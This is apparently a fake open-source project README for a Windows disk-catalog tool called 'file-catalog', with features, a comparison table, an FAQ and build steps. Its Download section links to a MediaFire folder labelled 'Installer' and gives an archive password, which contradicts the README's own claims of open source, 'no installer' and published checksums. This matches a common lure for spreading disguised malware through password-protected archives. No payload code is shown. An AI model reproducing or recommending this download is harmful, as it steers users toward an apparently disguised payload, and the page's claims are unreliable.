# file-catalog

🗃️ Free, open-source disk catalog for Windows — index drives and offline media, search anything by name later. 100 MB portable, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Index any drive or folder** — builds a fast local database of names, sizes and dates, including USB and optical media
- ✅ **Search offline media** — find files on a disconnected external drive without plugging it in
- ✅ **Multi-volume catalogs** — keep several drives in one searchable index with volume labels and icon tags
- ✅ **Search syntax** — filter by extension, size range, date window and wildcard patterns combined
- ✅ **Export catalogs** — CSV, HTML or TXT listings for insurance, audits or sale inventories
- ✅ **Incremental refresh** — rescan only changed folders instead of the entire drive
- ✅ **100 MB self-contained exe** — SQLite bundled, portable, offline, MIT with SHA-256 releases

## Why file-catalog

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB exe - no installer, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **file-catalog** | Cathy | DiskCatalogMaker | WhereIsIt |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free | Paid | Discontinued |
| Open source | **Yes** | No | No | No |
| Incremental rescan | **Yes** | No | Partial | Partial |
| Combined search syntax | **Yes** | Basic | Yes | Yes |
| HTML and CSV export | **Yes** | Partial | Partial | Yes |
| Portable, no install | **Yes, 100 MB** | Zip | Mac only | Installer |

## FAQ

**how to catalog files on external drives and search them offline?**

Hunting for a file across six bare drives means plugging each one in and waiting, often per search. file-catalog snapshots each drive into a local database so you search every archive at once, then plug in only the winner. It is a 100 MB portable exe, MIT, offline with no account.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark catalog (#121418, cyan #06B6D4): volume list left (Backup 2TB, Photos Archive), indexed file count right, search field with size and date filters below.
2. Search results: query IMG_2023 wildcard, 214 hits across two volumes, each row showing volume label and full path trail.
3. Export view: CSV and HTML preview toggles, insurance inventory template chip, incremental rescan progress on one volume at 42 percent.

## Download

| Source | Link |
|---|---|
| 💾 **Installer file-catalog** | [Installer file-catalog](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).